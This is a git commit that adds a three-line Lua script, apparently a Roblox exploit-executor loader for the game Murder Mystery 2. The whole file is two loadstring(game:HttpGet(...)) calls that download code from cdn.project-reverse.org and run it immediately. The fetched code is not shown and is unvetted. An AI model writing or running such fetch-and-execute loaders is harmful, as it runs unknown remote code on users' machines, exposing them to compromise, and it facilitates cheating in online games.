75a9388acad6a23d734670e10a2884c62c968110
xlolo30127 <lolo30127aaaa@outlook.fr>
2026-05-10 05:19:13 -0700

    Add script_Cvjpjszz_1778415552136.lua

---
+++ script_Cvjpjszz_1778415552136.lua
@@ -0,0 +1,3 @@
+ID="16d32721-0de7-4015-83b9-5c388eee35a2";
+RUN_AFTER=loadstring(game:HttpGet("https://cdn.project-reverse.org/mm2_visual_new_ui.luau"));
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
